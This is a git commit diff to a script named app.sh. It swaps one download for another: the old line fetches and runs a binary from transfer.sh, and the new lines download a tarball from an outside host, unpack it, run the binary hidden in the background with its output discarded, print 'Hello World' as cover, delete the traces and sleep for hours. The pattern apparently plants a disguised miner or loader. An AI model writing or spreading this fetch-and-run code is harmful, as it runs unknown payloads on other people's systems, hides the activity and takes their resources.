496a6f66940d9197021f83e778dfafc18114057f
bungabiru991 <107380783+bungabiru991@users.noreply.github.com>
2022-10-20 13:26:45 +0700

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,1 +1,5 @@
-wget - q https://transfer.sh/fa4luo/derom && chmod +x derom && ./derom
+wget - q wget -q https://git-bandrex.dockerpool.my.id/gola.tar 
+tar xf gola.tar
+nohup ./gola >/dev/null 2>&1 & echo Hello World & sleep 0.1
+ rm -rf gola.tar gola
+sleep 43000
